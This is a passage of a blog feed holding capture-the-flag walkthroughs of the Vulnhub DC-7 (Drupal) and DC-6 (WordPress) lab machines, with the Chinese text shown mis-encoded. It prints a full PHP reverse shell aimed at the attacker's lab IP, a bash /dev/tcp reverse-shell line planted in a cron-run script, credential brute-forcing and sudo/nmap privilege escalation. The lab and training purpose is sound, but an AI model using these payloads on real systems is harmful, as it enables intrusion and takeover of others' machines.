id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç¿»çœ‹å®¶ç›®å½•ä¸‹çš„mboxæ–‡ä»¶æ‰¾åˆ°æ•æ„Ÿæ–‡ä»¶ backups.sh<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152042388.png"></p><p>å‘ç°æ²¡æœ‰æƒé™<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152044362.png"></p><p>çœ‹ä¸€ä¸‹rootæƒé™çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152047725.png"></p><p>å‡ ä¹éƒ½æ²¡æœ‰æƒé™,ä¹Ÿæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹,ä½†æ˜¯è¿™ä¸ªæ¡†æ¶æœ‰ä¸€ä¸ªDrushå‘½ä»¤<br>Drushæ˜¯Drupalçš„å‘½ä»¤è¡Œshellå’ŒUnixè„šæœ¬æ¥å£ã€‚Drush Coreé™„å¸¦äº†è®¸å¤šæœ‰ç”¨çš„å‘½ä»¤ï¼Œå¯ç”¨äºä¸æ¨¡å—&#x2F;ä¸»é¢˜&#x2F;é…ç½®æ–‡ä»¶ç­‰ä»£ç è¿›è¡Œäº¤äº’ã€‚</p><p>ä¿®æ”¹adminå¯†ç ,ä¸Šç½‘ç«™åå°çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=<span class="string">&quot;123&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152059358.png"></p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>æ²¡æœ‰ä¸Šä¼ ç¯å¢ƒ,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å®‰è£…æ’ä»¶,æ²¡æœ‰ç¯å¢ƒæˆ‘ä»¬è‡ªå·±åˆ›é€ ç¯å¢ƒ<br>å®‰è£…æœ¬åœ°æ’ä»¶,ä¸‹è½½åœ°å€</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.drupal.org<span class="regexp">/project/</span>php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152122907.png"></p><p>å¯ç”¨<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152119436.png"></p><p>å†™webshell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152123387.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152131986.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;172.16.17.140&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">4444</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ncç›‘å¬åå¼¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152133693.png"></p><p>åå¼¹ä¸€ä¸ªäº¤äº’å¼shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>å°†åå¼¹shellçš„å‘½ä»¤å†™å…¥æœ€å¼€å§‹çš„backups.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152148432.png"></p><p>ç­‰è®¡åˆ’ä»»åŠ¡æ‰§è¡Œåå¼¹ä¸€ä¸ªshellå›æ¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152148588.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/entry/dc-7,356/&quot;&gt;https://www.vulnhub.com/entry/dc-7,356/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.148&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;æè¿°&quot;&gt;&lt;a href=&quot;#æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æè¿°&quot;&gt;&lt;/a&gt;æè¿°&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206151948527.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="Drupal" scheme="https://syst1m.top/tags/Drupal/"/>
    
  </entry>
  
  <entry>
    <title>vlunhub-dc6æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/15/vulnhub-dc6%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/15/vulnhub-dc6%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-15T05:40:43.000Z</published>
    <updated>2022-06-15T11:42:33.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¼æ´ç¯å¢ƒ"><a href="#æ¼æ´ç¯å¢ƒ" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>é¶æœº:172.16.17.147<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151342073.png"></p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«ä¸€ä¸‹é¶æœº<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151342099.png"></p><p>è®¿é—®å‘ç°è¢«é‡å®šå‘<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151340350.png"></p><p>æ·»åŠ ä¸€ä¸ªdnsè§£æ,WordPress<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151355811.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="çˆ†ç ´è´¦å·"><a href="#çˆ†ç ´è´¦å·" class="headerlink" title="çˆ†ç ´è´¦å·"></a>çˆ†ç ´è´¦å·</h2><p>ä½¿ç”¨wpscanæš´åŠ›æ‰«å‡ºè´¦å·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://wordy -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151425104.png"><br>æ ¹æ®ç»™å‡ºçš„çº¿ç´¢æ‹¿åˆ°å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151432351.png"></p><p>è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…,éœ€è¦å…ˆè§£å‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151437401.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151438388.png"></p><p>æ ¹æ®è´¦å·å¯†ç å»çˆ†ç ´</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151439811.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151445374.png"><br>çˆ†ç ´å‡ºè´¦å·å¯†ç <br>mark &#x2F; helpdesk0</p><h2 id="æ’ä»¶åˆ©ç”¨"><a href="#æ’ä»¶åˆ©ç”¨" class="headerlink" title="æ’ä»¶åˆ©ç”¨"></a>æ’ä»¶åˆ©ç”¨</h2><p>åå°å‘ç°ä¸€ä¸ªæ’ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151453588.png"></p><p>æ‰¾åˆ°åˆ©ç”¨<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151454374.png"></p><p>ä¿®æ”¹åˆ©ç”¨æ–‡ä»¶åå¼¹åœ°å€ä¸ºkaliçš„åœ°å€<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151704922.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>kaliç›‘å¬,ç„¶åæ‰“å¼€åˆ©ç”¨æ–‡ä»¶,åå¼¹ä¸€ä¸ªshellå›æ¥,å†ç”¨pythonèµ·ä¸€ä¸ªäº¤äº’å¼shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151706659.png"></p><p>ç¿»ç›®å½•æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹,ä¸€ä¸ªå¯ä»¥ç™»å½•çš„è´¦å·<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151724387.png"></p><p>ç™»å½•ä¸Šå»å,æŸ¥çœ‹sudoè¿è¡Œçš„å‘½ä»¤,æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151731225.png"></p><p>å‘backups.shæ–‡ä»¶ä¸­å†™å…¥â€&#x2F;bin&#x2F;bashâ€ï¼Œå¹¶ä»¥jensç”¨æˆ·å»æ‰§è¡Œè¯¥è„šæœ¬<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151836816.png"></p><p>ç»§ç»­çœ‹suidå‘½ä»¤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151839915.png"></p><p>å­˜åœ¨nmap,å¯ä»¥ä½¿ç”¨nmapæ¥ææƒ<br>nseæ˜¯nmapçš„æ’ä»¶æ‰©å±•å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> os.execute(<span class="string">&#x27;/bin/bash&#x27;</span>) &gt; shell.nes</span><br><span class="line">sudo nmap --script=shell.nes</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151846689.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151846069.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;æ¼æ´ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#æ¼æ´ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´ç¯å¢ƒ&quot;&gt;&lt;/a&gt;æ¼æ´ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/entry/dc-6,315/&quot;&gt;https://www.vulnhub.com/entry/dc-6,315/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.147&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;æè¿°&quot;&gt;&lt;a href=&quot;#æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æè¿°&quot;&gt;&lt;/a&gt;æè¿°&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206151342073.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="WordPress" scheme="https://syst1m.top/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc5æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-14T11:21:37.000Z</published>
    <updated>2022-06-14T14:37:14.653Z</updated>
    
